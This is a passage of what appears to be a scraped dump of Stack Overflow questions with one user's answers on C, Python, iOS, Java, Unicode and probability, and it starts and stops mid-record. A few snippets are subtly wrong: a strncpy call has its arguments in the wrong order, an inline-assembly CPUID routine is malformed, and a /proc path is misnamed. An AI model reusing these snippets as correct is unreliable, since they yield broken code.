  <p>Imagine an urn filled with balls, two-thirds of which are of one color and one-third of which are of another. One individual has drawn 5 balls from the urn and found that 4 are red and 1 is white. Another individual has drawn 20 balls and found that 12 are red and 8 are white. Which of the two individuals should feel more confident that the urn contains two-thirds red balls and one-third white balls, rather than vice-versa? What odds should each individual give?</p>
</blockquote>

<p>I know the right answer, but maybe I don't quite get the odds calculation. Can anyone explain?</p>
","9530","Adam Rosenfield","<p>Let <strong>A</strong> be the event that 2/3 of the balls are red, and then ¬<strong>A</strong> is the event that 2/3 of the balls are white.  Let <strong>B</strong> be the event that the first observer sees 4 red balls out of 5, and let <strong>C</strong> be the event that the second observer sees 12 red balls out of 20.</p>

<p>Applying some simple combinatorics, we get that</p>

<ul>
<li>P(<strong>B</strong>|<strong>A</strong>) = (5 choose 4)(2/3)<sup>4</sup>(1/3)<sup>1</sup> = 80/243</li>
<li>P(<strong>B</strong>|¬<strong>A</strong>) = (5 choose 4)(1/3)<sup>4</sup>(2/3)<sup>1</sup> = 10/243</li>
</ul>

<p>Therefore, from Bayes' Law, observer 1 has a confidence level of 80/(80+10) = 8/9 that <strong>A</strong> is true.</p>

<p>For the second observer:</p>

<ul>
<li>P(<strong>C</strong>|<strong>A</strong>) = (20 choose 12)(2/3)<sup>12</sup>(1/3)<sup>8</sup> = 125970 * 2<sup>12</sup>/3<sup>20</sup></li>
<li>P(<strong>C</strong>|¬<strong>A</strong>) = (20 choose 12)(1/3)<sup>12</sup>(2/3)<sup>8</sup> = 125970 * 2<sup>8</sup>/3<sup>20</sup></li>
</ul>

<p>So again from Bayes' Law, observer 2 has a confidence level of 2<sup>12</sup>/(2<sup>12</sup> + 2<sup>8</sup>) = 16/17 that <strong>A</strong> is true.</p>

<p>Therefore, <strong>observer two</strong> has a higher confidence level that 2/3 of the balls are red.  The key is to understand how Bayes' Law works.  In fact, all that matters is the <em>difference</em> in the number of red and white balls observed.  Everything else (specifically the total number of balls drawn) cancels out in the equations.</p>
"
"<p>What's an easy way to read random line from a file in Unix command line?</p>
","9530","Adam Rosenfield","<p>Here's a simple Python script that will do the job:</p>

<pre class=""lang-py prettyprint-override""><code>import random, sys
lines = open(sys.argv[1]).readlines()
print(lines[random.randrange(len(lines))])
</code></pre>

<p>Usage:</p>

<pre><code>python randline.py file_to_get_random_line_from
</code></pre>
"
"<p>Is there a way to determine the device running an application.  I want to distinguish between iPhone and iPod Touch if possible.</p>
","9530","Adam Rosenfield","<p>You can use the <a href=""https://developer.apple.com/library/ios/documentation/UIKit/Reference/UIDevice_Class/index.html#//apple_ref/occ/instp/UIDevice/model""><code>UIDevice</code></a> class like this:</p>

<pre><code>NSString *deviceType = [UIDevice currentDevice].model;

if([deviceType isEqualToString:@""iPhone""])
    // it's an iPhone
</code></pre>
"
"<p>How do you encode and decode a CGPoint struct using NSCoder?</p>
","9530","Adam Rosenfield","<p><code>CGPoint</code>s and <code>NSPoint</code>s are both structures composed of two <code>CGFloat</code> values, so you can freely pass them around as each other.  The quick and dirty way would be:</p>

<pre><code>NSCoder *myNSCoder;
CGPoint myPoint;
[myNSCoder encodePoint:*(NSPoint *)myPoint];
</code></pre>

<p>This will usually work, but it technically breaks the C99 strict aliasing rules.  If you want to be 100% compatible with the standard, you'll have to do something like:</p>

<pre><code>typedef union
{
  CGPoint cgPoint;
  NSPoint nsPoint;
} CGNSPoint;

CGNSPoint cgnsPoint = { .cgPoint = myPoint };
[myNSCoder encodePoint:cgnsPoint.nsPoint];
</code></pre>
"
"<p>Is the following construct thread-safe, assuming that the elements of foo are aligned and sized properly so that there is no word tearing?  If not, why not?</p>

<p>Note:  The code below is a toy example of what I want to do, not my actual real world scenario.  Obviously, there are better ways of coding the observable behavior in my example.</p>

<pre><code>uint[] foo;
// Fill foo with data.

// In thread one:
for(uint i = 0; i &lt; foo.length; i++) {
     if(foo[i] &lt; SOME_NUMBER) {
         foo[i] = MAGIC_VAL;
     }
}

// In thread two:
for(uint i = 0; i &lt; foo.length; i++) {
     if(foo[i] &lt; SOME_OTHER_NUMBER) {
         foo[i] = MAGIC_VAL;
     }
}
</code></pre>

<p>This obviously looks unsafe at first glance, so I'll highlight why I think it could be safe:</p>

<ol>
<li>The only two options are for an element of foo to be unchanged or to be set to MAGIC_VAL.  </li>
<li>If thread two sees foo[i] in an intermediate state while it's being updated, only two things can happen:  The intermediate state is &lt; <code>SOME_OTHER_NUMBER</code> or it's not.  If it is &lt; <code>SOME_OTHER_NUMBER</code>, thread two will also try to set it to MAGIC_VAL.  If not, thread two will do nothing.</li>
</ol>

<p>Edit:  Also, what if foo is a long or a double or something, so that updating it can't be done atomically?  You may still assume that alignment, etc. is such that updating one element of foo will not affect any other element.  Also, the whole point of multithreading in this case is performance, so any type of locking would defeat this.</p>
","9530","Adam Rosenfield","<p>If reads and writes to each array element are atomic (i.e. they're aligned properly with no word tearing as you mentioned), then there shouldn't be any problems in this code.  If <code>foo[i]</code> is less than either of <code>SOME_NUMBER</code> or <code>SOME_OTHER_NUMBER</code>, then at least one thread (possibly both) will set it to <code>MAGIC_VAL</code> at some point; otherwise, it will be untouched.  With atomic reads and writes, there are no other possibilities.</p>

<p>However, since your situation is more complicated, be very very careful -- make sure that <code>foo[i]</code> is truly only read once per loop and stored in a local variable.  If you read it more than once during the same iteration, you could get inconsistent results.  Even the slightest change you make to your code could immediately make it unsafe with race conditions, so comment heavily about the code with big red warning signs.</p>
"
"<p>I have some Tkinter canvas and some picture of lines and text on it. Is there an easy way to copy it to a clipboard?</p>
","9530","Adam Rosenfield","<p>You could use <a href=""http://infohost.nmt.edu/tcc/help/pubs/tkinter/canvas-methods.html"" rel=""nofollow""><code>.postscript</code></a> method of the canvas to get an Encapsulated PostScript (EPS) representation of the contents.  Then, use `<a href=""http://www.imagemagick.org"" rel=""nofollow"">ImageMagick</a>'s Python bindings (<a href=""http://www.imagemagick.org/download/python/"" rel=""nofollow"">PythonMagick</a> or <a href=""http://www.procoders.net/?p=39"" rel=""nofollow"">PythonMagickWand</a>) to convert the EPS to a Windows Enhanced Metafile (EMF).  Finally, copy it to the clipboard (e.g. using <a href=""http://stackoverflow.com/questions/457514/how-to-copy-a-picture-from-canvas-to-clipboard#458236"">nosklo's solution</a>) with the <a href=""http://msdn.microsoft.com/en-us/library/ms649013(VS.85).aspx"" rel=""nofollow"">CF_ENHMETAFILE</a> clipboard format.</p>
"
"<p>How can I detect which CPU is being used at runtime ? The c++ code needs to differentiate between AMD / Intel architectures ? Using gcc 4.2.  </p>
","9530","Adam Rosenfield","<p>If you're on Linux (or on Windows running under Cygwin), you can figure that out by reading the special file <code>/proc/cpuinfo</code> and looking for the line beginning with <code>vendor_id</code>.  If the string is <code>GenuineIntel</code>, you're running on an Intel chip.  If you get <code>AuthenticAMD</code>, you're running on an AMD chip.</p>

<pre><code>void get_vendor_id(char *vendor_id)  // must be at least 13 bytes
{
    FILE *cpuinfo = fopen(""/proc/cpuinfo"", ""r"");
    if(cpuinfo == NULL)
        ;  // handle error
    char line[256];
    while(fgets(line, 256, cpuinfo))
    {
        if(strncmp(line, ""vendor_id"", 9) == 0)
        {
            char *colon = strchr(line, ':');
            if(colon == NULL || colon[1] == 0)
                ;  // handle error
            strncpy(vendor_id, 12, colon + 2);
            fclose(cpuinfo);
            return;
        }
    }

    // if we got here, handle error
    fclose(cpuinfo);
}
</code></pre>

<p>If you know you're running on an x86 architecture, a less portable method would be to use the CPUID instruction:</p>

<pre><code>void get_vendor_id(char *vendor_id)  // must be at least 13 bytes
{
    // GCC inline assembler
    __asm__ __volatile__
        (""movl $0, %%eax\n\t""
         ""cpuid\n\t""
         ""movl %%ebx, %0\n\t""
         ""movl %%edx, %1\n\t""
         ""movl %%ecx, %2\n\t""
         : ""=m""(vendor_id), ""=m""(vendor_id + 4), ""=m""(vendor_id + 8)  // outputs
         : // no inputs
         : ""%eax"", ""%ebx"", ""%edx"", ""%ecx"", ""memory"");  // clobbered registers
    vendor_id[12] = 0;
}

int main(void)
{
    char vendor_id[13];
    get_vendor_id(vendor_id);

    if(strcmp(vendor_id, ""GenuineIntel"") == 0)
        ; // it's Intel
    else if(strcmp(vendor_id, ""AuthenticAMD"") == 0)
        ; // it's AMD
    else
        ; // other
    return 0;
}
</code></pre>
"
"<p>For a programming class I am creating a blackjack program for the first homework assignment. The professor has given us a sample Card class, which includes the method to add them to a deck. For her deck, she uses an ArrayList, which you can easily Knuth Shuffle with the Collections.shuffle() method.</p>

<p>That method does not work for Stacks though (obviously), but I think a Stack structure would work best for this program because you may pop and push cards into and out of the deck.</p>
","9530","Adam Rosenfield","<p>Both <a href=""http://java.sun.com/javase/6/docs/api/java/util/ArrayList.html""><code>java.util.ArrayList&lt;E&gt;</code></a> and <a href=""http://java.sun.com/javase/6/docs/api/java/util/Stack.html""><code>java.util.stack&lt;E&gt;</code></a> implement the <a href=""http://java.sun.com/javase/6/docs/api/java/util/List.html""><code>java.util.List&lt;E&gt;</code></a> interface, and <a href=""http://java.sun.com/javase/6/docs/api/java/util/Collections.html#shuffle(java.util.List)""><code>Collections.shuffle()</code></a> takes a <code>java.util.List&lt;?&gt;</code> as a parameter.  You should be able to pass a <code>Stack</code> into <code>Collections.shuffle()</code>, unless you're using a different stack implementation that does not implement <code>java.util.list&lt;E&gt;</code>.  If you are, I would advise you to switch to a different stack implementation.</p>
"
"<p>Is writing to stdout using <code>printf</code> thread-safe on Linux? What about using the lower-level <code>write</code> command?</p>
","9530","Adam Rosenfield","<p>It's not specified by the C standard -- it depends on your implementation of the C standard library.  In fact, the C standard doesn't even mention threads at all, since certain systems (e.g. embedded systems) don't have multithreading.</p>

<p>In the GNU implementation (<code>glibc</code>), most of the higher-level functions in stdio that deal with <code>FILE*</code> objects are thread-safe.  The ones that aren't usually have <code>unlocked</code> in their names (e.g. <code>getc_unlocked(3)</code>).  However, the thread safety is at a per-function call level: if you make multiple calls to <code>printf(3)</code>, for example, each of those calls is guaranteed to output atomically, but other threads might print things out between your calls to <code>printf()</code>.  If you want to ensure that a sequence of I/O calls gets output atomically, you can surround them with a pair of <code>flockfile(3)/funlockfile(3)</code> calls to lock the <code>FILE</code> handle.  Note that these functions are reentrant, so you can safely call <code>printf()</code> in between them, and that won't result in deadlock even thought <code>printf()</code> itself makes a call to <code>flockfile()</code>.</p>

<p>The low-level I/O calls such as <code>write(2)</code> should be thread-safe, but I'm not 100% sure of that - <code>write()</code> makes a system call into the kernel to perform I/O.  How exactly this happens depends on what kernel you're using.  It might be the <code>sysenter</code> instruction, or the <code>int</code> (interrupt) instruction on older systems.  Once inside the kernel, it's up to the kernel to make sure that the I/O is thread-safe.  In a test I just did with the Darwin Kernel Version 8.11.1, <code>write(2)</code> appears to be thread-safe.</p>
"
"<p><strong>Is there a way to portably determine the upper and lower bound on void-pointer values in ANSI C89/ISO C90?</strong> (I currently do not have a copy of the standard with me (I have one at home). Of course if void-pointer values are guaranteed to be unsigned  this task is trivial (via sizeof(void *)); however, I cannot recall if this is guaranteed or not. I can think of a few very inefficient algorithms (increment until overflow, etc.), but I would like to know if anyone has a relatively cheap (in terms of time-complexity) and portable way to calculate these bounds.)</p>

<p>--EDIT--</p>

<p><strong>Also:</strong> Is there a portable way to determine the validity of the pointer values?</p>

<p><strong>Why:</strong> This came up in a discussion with a co-worker and it stumped me. I don't know what he's working on, but I just want to know because I am interested! :-)</p>
","9530","Adam Rosenfield","<p>There is no portable way to determine if a given pointer is valid or not.  You have to know what kind of memory system you're dealing with.  Depending on the operating system and processor, there may or may not be a way to query the virtual memory manager's page tables to determine the valid ranges of pointers.</p>

<p>For example, on Linux, you can examine the special <code>mmap</code> file under <code>/proc</code> to get the virtual memory map of a process.  Here's an example of <code>cat</code> reading out its own memory map:</p>

<pre>
$ cat /proc/self/mmap
08048000-0804c000 r-xp 00000000 09:00 5128276                            /bin/cat
0804c000-0804d000 rw-p 00003000 09:00 5128276                            /bin/cat
0804d000-0806e000 rw-p 0804d000 00:00 0                                  [heap]
f7ca7000-f7e40000 r--p 00000000 09:00 3409654                            /usr/lib/locale/locale-archive
f7e40000-f7e41000 rw-p f7e40000 00:00 0 
f7e41000-f7f68000 r-xp 00000000 09:00 2654292                            /lib/tls/i686/cmov/libc-2.3.6.so
f7f68000-f7f6d000 r--p 00127000 09:00 2654292                            /lib/tls/i686/cmov/libc-2.3.6.so
f7f6d000-f7f6f000 rw-p 0012c000 09:00 2654292                            /lib/tls/i686/cmov/libc-2.3.6.so
f7f6f000-f7f72000 rw-p f7f6f000 00:00 0 
f7f83000-f7f85000 rw-p f7f83000 00:00 0 
f7f85000-f7f9a000 r-xp 00000000 09:00 2637871                            /lib/ld-2.3.6.so
f7f9a000-f7f9c000 rw-p 00014000 09:00 2637871                            /lib/ld-2.3.6.so
ff821000-ff836000 rw-p 7ffffffea000 00:00 0                              [stack]
ffffe000-fffff000 r-xp ffffe000 00:00 0                                  [vdso]
</pre>

<p>You can see the ranges of valid pointers, along with the bits indicating if the memory is (r)eadable, (w)ritable, e(x)ecutable, or (p)resent (i.e. not paged out to disk).</p>
"
"<p>If I have a string such as</p>

<p>""17:31:51 up 134 days, 11:26,  1 user,  load average: 0.22, 0.15, 0.10""</p>

<p>what is the best way to extract just the x3 load average values at the end? I have written a regexp that does this but is this the most efficient / fastest method?</p>

<pre><code>&gt;&gt;&gt; s = ""17:31:51 up 134 days, 11:26,  1 user,  load average: 0.22, 0.15, 0.10""
&gt;&gt;&gt; print re.findall(r""([0-9]\.\d+)"", s)
['0.22', '0.15', '0.10']
</code></pre>
","9530","Adam Rosenfield","<p>This should work:</p>

<pre><code># s is the string to parse
loadavg = [float(x) for x in s.rsplit('load average: ', 1)[1].split(', ')]
</code></pre>
"
"<p>I have a bunch of Python modules in a directory, all being a derivate class. I need a ""runner"" script that, for each module, instantiate the class that is inside it (the actual class name can be built by the module file name) and than call the ""go"" method on each of them.</p>

<p>I don't know how many modules are there, but I can list all of them globbing the directory via something like ""bot_*.py""</p>

<p>I think this is something about ""meta programming"", but how could be the best (most elegant) way to do it?</p>
","9530","Adam Rosenfield","<p>You could use <a href=""http://docs.python.org/library/functions.html#__import__"" rel=""nofollow""><code>__import__()</code></a> to load each module, use <a href=""http://docs.python.org/library/functions.html#dir"" rel=""nofollow""><code>dir()</code></a> to find all objects in each module, find all objects which are classes, instantiate them, and run the <code>go()</code> method:</p>

<pre><code>import types
for module_name in list_of_modules_to_load:
    module = __import__(module_name)
    for name in dir(module):
        object = module.__dict__[name]
        if type(object) == types.ClassType:
            object().go()
</code></pre>
"
"<p>I have a large amount of text in a UITextView. I want to let the user press a button and save the line that is displayed at the top of the view. Then when the same button is pressed it jumps to that exact line when the app is opened at a later time. Just like a physical bookmark.</p>

<p>How can I determine where the text is, or scrolling is?
How can I auto scroll to that position later?</p>
","9530","Adam Rosenfield","<p><code>UITextView</code> is a subclass of <a href=""http://developer.apple.com/iphone/library/documentation/UIKit/Reference/UIScrollView_Class/Reference/UIScrollView.html#//apple_ref/occ/cl/UIScrollView"" rel=""nofollow""><code>UIScrollView</code></a>, so you can use the <code>UIScrollView</code> messages <a href=""http://developer.apple.com/iphone/library/documentation/UIKit/Reference/UIScrollView_Class/Reference/UIScrollView.html#//apple_ref/occ/instp/UIScrollView/contentOffset"" rel=""nofollow""><code>contentOffset</code></a> and <a href=""http://developer.apple.com/iphone/library/documentation/UIKit/Reference/UIScrollView_Class/Reference/UIScrollView.html#//apple_ref/occ/instm/UIScrollView/setContentOffset:animated:"" rel=""nofollow""><code>setContentOffset:animated:</code></a> to get and set the scrolling offset respectively.</p>
"
"<p>I wonder what is the proper way to get back some message from a child view.</p>

<p>I have a object that is edited in the child view. I wanna see in the TableView their modifications.</p>

<p>However, I don't know a clean way to do it (I don't like a singleton here).</p>

<p>Is possible get notified when the Child view dissapear and get some info on that?</p>
","9530","Adam Rosenfield","<p>You can use the <code>UIViewController</code> notifications <a href=""http://developer.apple.com/iphone/library/documentation/UIKit/Reference/UIViewController_Class/Reference/Reference.html#//apple_ref/occ/instm/UIViewController/viewWillDisappear:"" rel=""nofollow""><code>viewWillDisappear:</code></a> and <a href=""http://developer.apple.com/iphone/library/documentation/UIKit/Reference/UIViewController_Class/Reference/Reference.html#//apple_ref/occ/instm/UIViewController/viewDidDisappear:"" rel=""nofollow""><code>viewDidDisappear:</code></a> to be notified right before a certain <code>UIView</code> is about to disappear and right after it disappears respectively.  Note that most of the various UIKit objects (including <code>UITableView</code>) are subclasses of <code>UIView</code>.</p>
"
"<p>How do I tell if gcc (more specifically, g++) is optimizing tail recursion <em>in a particular function</em>?  (Because it's come up a few times: I don't want to test if gcc can optimize tail recursion in general.  I want to know if it optimizes <strong>my</strong> tail recursive function.)</p>

<p>If your answer is ""look at the generated assembler"", I'd like to know exactly what I'm looking for, and whether or not I could write a simple program that examines the assembler to see if there's optimization.</p>

<p>PS.  I know this appears as part of the question <a href=""http://stackoverflow.com/questions/34125/which-if-any-c-compilers-do-tail-recursion-optimization"">Which, if any, C++ compilers do tail-recursion optimization?</a> from 5 months ago.  However, I don't think <em>this part</em> of that question was answered satisfactorily.  (The answer there was ""The easiest way to check if the compiler did the optimization (that I know of) is perform a call that would otherwise result in a stack overflow – or looking at the assembly output."")</p>
","9530","Adam Rosenfield","<p>Look at the generated assembly code and see if it uses a <code>call</code> or <code>jmp</code> instruction for the recursive call on x86 (for other architectures, look up the corresponding instructions).  You can use <code>nm</code> and <code>objdump</code> to get just the assembly corresponding to your function.  Consider the following function:</p>

<pre><code>int fact(int n)
{
  return n &lt;= 1 ? 1 : n * fact(n-1);
}
</code></pre>

<p>Compile as</p>

<pre><code>gcc fact.c -c -o fact.o -O2
</code></pre>

<p>Then, to test if it's using tail recursion:</p>

<pre><code># get starting address and size of function fact from nm
ADDR=$(nm --print-size --radix=d fact.o | grep ' fact$' | cut -d ' ' -f 1,2)
# strip leading 0's to avoid being interpreted by objdump as octal addresses
STARTADDR=$(echo $ADDR | cut -d ' ' -f 1 | sed 's/^0*\(.\)/\1/')
SIZE=$(echo $ADDR | cut -d ' ' -f 2 | sed 's/^0*//')
STOPADDR=$(( $STARTADDR + $SIZE ))

# now disassemble the function and look for an instruction of the form
# call addr &lt;fact+offset&gt;
if objdump --disassemble fact.o --start-address=$STARTADDR --stop-address=$STOPADDR | \
    grep -qE 'call +[0-9a-f]+ &lt;fact\+'
then
    echo ""fact is NOT tail recursive""
else
    echo ""fact is tail recursive""
fi
</code></pre>

<p>When ran on the above function, this script prints ""fact is tail recursive"".  When instead compiled with <code>-O3</code> instead of <code>-O2</code>, this curiously prints ""fact is NOT tail recursive"".</p>

<p>Note that this might yield false negatives, as ehemient pointed out in his comment.  This script will only yield the right answer if the function contains no recursive calls to itself at all, and it also doesn't detect sibling recursion (e.g. where <code>A()</code> calls <code>B()</code> which calls <code>A()</code>).  I can't think of a more robust method at the moment that doesn't involve having a human look at the generated assembly, but at least you can use this script to easily grab the assembly corresponding to a particular function within an object file.</p>
"
"<p>I want to reverse a regular expression. i.e. given a regular expression, I want to produce <em>any</em> string that will match that regex.</p>

<p>I know how to do this from a theoretical computer science background using finite state machine, I just want to know if someone has already written a library to do this. :)</p>

<p>I'm using Python, so I'd like a python library.</p>

<p>To reiterate, I only want <em>one</em> string that will match the regex. Things like ""."" or "".*"" would make an infinite amount of strings match the regex, but I don't care about all options.</p>

<p>I'm willing for this library to only work on a certain subset of regex.</p>
","9530","Adam Rosenfield","<p>Unless your regex is extremely simple (i.e. no stars or pluses), there will be infinitely many strings which match it.  If your regex only involves concatenation and alternation, then you can expand each alternation into all of its possibilities, e.g. <code>(foo|bar)(baz|quux)</code> can be expanded into the list <code>['foobaz', 'fooquux', 'barbaz', 'barquux']</code>.</p>
"
"<p>I'm working on a C-brain teaser:  Write the standard Hello-World program, without semi-colons.</p>

<p>My best answer so far is:</p>

<pre><code>int main(void)
{
    if (printf(""Hello World!\n""), exit(0), 0)
    {
        /* do nothing */
    }
}
</code></pre>

<p>But I don't understand why I don't get compiler error (Visual Studio):</p>

<pre><code>error C4716: 'main' : must return a value
</code></pre>

<p>I've tried other functions with a return-type declared, but missing a return-statement, and get this compiler error.</p>

<hr>

<p>Note that I've also tried:</p>

<pre><code>int foo(void)
{
    if (printf(""Hello World!\n""), exit(0), true)
    {
        /* do nothing */
    }
}

int main(void)
{
    foo();
}
</code></pre>

<p>And don't get a compiler error on foo.  If I remove the ""exit(0)"", I <em>do</em> get the compiler error.  Apparently the compiler has knowledge that ""exit"" is a special function?  This seems very odd to me.</p>
","9530","Adam Rosenfield","<p>Because it's not an error -- it's undefined behavior.  See section 6.9.1, paragraph 12 of the C99 standard:</p>

<blockquote>
  <p>If the } that terminates a function is reached, and the value of the function call is used by the caller, the behavior is undefined.</p>
</blockquote>

<p>Thus, the compiler is free to do whatever it wants when seeing your code failing to return -- it can emit an error, a warning, or nothing at all.  In the case of GCC, it by default compiles successfully with no warnings or errors.  With the <code>-Wall</code> option, it emits a warning.</p>

<p><code>main()</code> is special in C: it's the only function that's allowed not to return a value.  The C standard says that if control reaches the end of <code>main()</code> without a <code>return</code> statement, it implicitly returns 0.  This is only true for <code>main()</code>, all other non-void functions must return a value.</p>

<p>Section 5.1.2.2.3:</p>

<blockquote>
  <p>If the return type of the main function is a type compatible with int, a return from the
  initial call to the main function is equivalent to calling the exit function with the value returned by the main function as its argument;10) reaching the } that terminates the
  main function returns a value of 0. If the return type is not compatible with int, the
  termination status returned to the host environment is unspecified.</p>
</blockquote>
"
"<p>how to set iPhone device to stay active ( to not lock ) while my app is running ?
Any idea </p>
","9530","Adam Rosenfield","<p>I'm not sure if this prevents the device from locking, but you can prevent the screen from dimming with the <code>UIApplication</code>'s <a href=""http://developer.apple.com/iphone/library/documentation/UIKit/Reference/UIApplication_Class/Reference/Reference.html#//apple_ref/occ/instp/UIApplication/idleTimerDisabled""><code>idleTimerDisabled</code></a> property:</p>

<pre><code>[UIApplication sharedApplication].idleTimerDisabled = YES;
</code></pre>

<p>From the documentation:</p>

<blockquote>
  <p><strong>Important</strong>: You should set this property only if necessary and should be sure to reset it to NO when the need no longer exists. Most applications should let the system turn off the screen when the idle timer elapses. This includes audio applications. With appropriate use of Audio Session Services, playback and recording proceed uninterrupted when the screen turns off. The only applications that should disable the idle timer are mapping applications, games, or similar programs with sporadic user interaction.</p>
</blockquote>
"
"<p>I don't quite understand the compiling process of the Linux kernel when I install 
a Linux system on my machine.</p>

<p>Here are some things that confused me:</p>

<ol>
<li>The kernel is written in C, however how did the kernel get compiled without a compiler installed?</li>
<li>If the C compiler is installed on my machine before the kernel is compiled, how can the compiler itself get compiled without a compiler installed?</li>
</ol>

<p>I was so confused for a couple of days, thanks for the response.</p>
","9530","Adam Rosenfield","<p>The kernel doesn't compile itself -- it's compiled by a C compiler in userspace.  In most CPU architectures, the CPU has a number of bits in special registers that represent what privileges the code currently running has.  In x86, these are the <em>current privilege level</em> bits (CPL) in the <em>code segment</em> (CS) register.  If the CPL bits are 00, the code is said to be running in <em>security ring 0</em>, also known as <em>kernel mode</em>.  If the CPL bits are 11, the code is said to be running in <em>security ring 3</em>, also known as <em>user mode</em>.  The other two combinations, 01 and 10 (security rings 1 and 2 respectively) are seldom used.</p>

<p>The rules about what code can and can't do in user mode versus kernel mode are rather complicated, but suffice to say, user mode has severely reduced privileges.</p>

<p>Now, when people talk about the kernel of an operating system, they're referring to the portions of the OS's code that get to run in kernel mode with elevated privileges.  Generally, the kernel authors try to keep the kernel as small as possible for security reasons, so that code which doesn't need extra privileges doesn't have them.</p>

<p>The C compiler is one example of such a program -- it doesn't need the extra privileges offered by kernel mode, so it runs in user mode, like most other programs.</p>

<p>In the case of Linux, the kernel consists of two parts: the source code of the kernel, and the compiled executable of the kernel.  Any machine with a C compiler can compile the kernel from the source code into the binary image.  The question, then, is what to do with that binary image.</p>

<p>When you install Linux on a new system, you're installing a precompiled binary image, usually from either physical media (such as a CD DVD) or from the network.  The BIOS will load the (binary image of the) kernel's bootloader from the media or network, and then the bootloader will install the (binary image of the) kernel onto your hard disk.  Then, when you reboot, the BIOS loads the kernel's bootloader from your hard disk, and the bootloader loads the kernel into memory, and you're off and running.</p>

<p>If you want to <em>recompile</em> your own kernel, that's a little trickier, but it can be done.</p>
"
"<p>What are the differences between UTF8, UTF16, and UTF32.  I understand that all 3 will store Unicode, and that how it stores the chars is different, but is there an advantage to choosing one over the other?</p>
","9530","Adam Rosenfield","<p>In short:</p>

<ul>
<li>UTF8: Variable-width encoding, backwards compatible with ASCII.  ASCII characters (U+0000 to U+007F) take 1 byte, code points U+0080 to U+07FF take 2 bytes, code points U+0800 to U+FFFF take 3 bytes, code points U+10000 to U+10FFFF take 4 bytes.  Good for English text, not so good for Asian text.</li>
<li>UTF16: Variable-width encoding.  Code points U+0000 to U+FFFF take 2 bytes, code points U+10000 to U+10FFFF take 4 bytes.  Bad for English text, good for Asian text.</li>
<li>UTF32: Fixed-width encoding.  All code points take 4 bytes.  An enormous memory hog, but fast to operate on.  Rarely used.</li>
</ul>

<p>In long: see Wikipedia: <a href=""http://en.wikipedia.org/wiki/UTF-8"">UTF-8</a>, <a href=""http://en.wikipedia.org/wiki/UTF-16"">UTF-16</a>, and <a href=""http://en.wikipedia.org/wiki/UTF-32"">UTF-32</a></p>
"
"<p>Which of the following is better?</p>

<pre><code>a instanceof B
</code></pre>

<p>or</p>

<pre><code>B.class.isAssignableFrom(a.getClass())
</code></pre>

<p>The only difference that I know of is, when 'a' is null, the first returns false, while the second throws an exception. Other than that, do they always give the same result?</p>
","9530","Adam Rosenfield","<p><code>instanceof</code> can only be used with reference types, not primitive types.  <code>isAssignableFrom()</code> can be used with any class objects:</p>

<pre><code>a instanceof int  // syntax error
3 instanceof Foo  // syntax error
int.class.isAssignableFrom(int.class)  // true
</code></pre>

<p>See <a href=""http://java.sun.com/javase/6/docs/api/java/lang/Class.html#isAssignableFrom(java.lang.Class)"">http://java.sun.com/javase/6/docs/api/java/lang/Class.html#isAssignableFrom(java.lang.Class)</a>.</p>
"
"<p>In Python, I can do:</p>

<pre><code>&gt;&gt;&gt; list = ['a', 'b', 'c']
&gt;&gt;&gt; ', '.join(list)
'a, b, c'
</code></pre>

<p>Is there any easy way to do the same when I have a list of objects?</p>

<pre><code>&gt;&gt;&gt; class Obj:
...     def __str__(self):
...         return 'name'
...
&gt;&gt;&gt; list = [Obj(), Obj(), Obj()]
&gt;&gt;&gt; ', '.join(list)
Traceback (most recent call last):
  File ""&lt;stdin&gt;"", line 1, in &lt;module&gt;
TypeError: sequence item 0: expected string, instance found
</code></pre>

<p>Or do I have to resort to a for loop?</p>
","9530","Adam Rosenfield","<p>You could use a list comprehension or a generator expression instead:</p>

<pre><code>', '.join([str(x) for x in list])  # list comprehension
', '.join(str(x) for x in list)    # generator expression
</code></pre>
"
"<p>I have a huge set of N-dimensional points (tens of millions; N is close to 100).</p>

<p>I need to map these points to a single dimension while preserving spatial locality. I want to use <a href=""http://en.wikipedia.org/wiki/Hilbert_curve"">Hilbert space-filling curve</a> to do it.</p>

<p>For each point I want to pick the closest point on the curve. The Hilbert value of the point (curve length from the start of curve to the picked point) is the single dimension value I seek.</p>

<p>Computation does not have to be instant, but I expect it to be no more than several hours 
on decent modern home PC hardware.</p>

<p>Any suggestions on implementation? Are there any libraries that would help me? (Language does not matter much.)</p>
","9530","Adam Rosenfield","<p>Another possibility would be to build a <a href=""http://en.wikipedia.org/wiki/Kd-tree"" rel=""nofollow"">kd-tree</a> on your data, and then to an in-order traversal of the tree to get the ordering.  Constructing the kd-tree only requires you to have a good median-finding algorithm, of which there are many.</p>
"
"<p>What is the purpose of anonymous { } blocks in C style languages (C, C++, C#)</p>

<p>Example -</p>

<pre><code>

void function()
{

  {
    int i = 0;
    i = i + 1;
  }

  {
    int k = 0;
    k = k + 1;
  }

}

</code></pre>

<p><strong>Edit</strong> - Thanks for all of the excellent answers!</p>
","9530","Adam Rosenfield","<p>Another common use is with OpenGL's <code>glPushMatrix()</code> and <code>glPopMatrix()</code> functions to create logical blocks relating to the matrix stack:</p>

<pre><code>glPushMatrix();
{
    glTranslate(...);
    glPushMatrix();
    {
        glRotate(...);
        // draw some stuff
    }
    glPopMatrix();
    // maybe draw some more stuff
}
glPopMatrix();
</code></pre>
"
"<p>I want to run a pkg file added as a component in my package based on certain conditions. How can I run the pkg file from AppleScript?</p>

<p>Thanks?</p>

<p><b>Edit:</b>
I am now able to run the pkg file using <i>open pkgFile.pkg</i> I want to embed this AppleScript as part of a package along with some other packages as the components of this pakage. Where do I mention this script so it is executed before the main application installation starts.</p>

<p>I tried adding the script as the preinstall script for the main app package but it gives an exception <b>The following install step failed: run preupgrade script</b></p>

<p>Any tips? Thanks.</p>
","9530","Adam Rosenfield","<p>I'm not an AppleScript programmer, so this is probably not the best way to do it, but this should work:</p>

<pre><code>do shell script ""open file.pkg""
</code></pre>
"
"<p>There are some data structures around that are really useful but are unknown to most programmers. Which ones are they?</p>

<p>Everybody knows about linked lists, binary trees, and hashes, but what about <a href=""http://en.wikipedia.org/wiki/Skip_list"">Skip lists</a> and <a href=""http://en.wikipedia.org/wiki/Bloom_filter"">Bloom filters</a> for example. I would like to know more data structures that are not so common, but are worth knowing because they rely on great ideas and enrich a programmer's tool box.</p>

<p>PS: I am also interested in techniques like <a href=""http://en.wikipedia.org/wiki/Dancing_Links"">Dancing links</a> which make clever use of properties of a common data structure. </p>

<p><strong>EDIT</strong>:
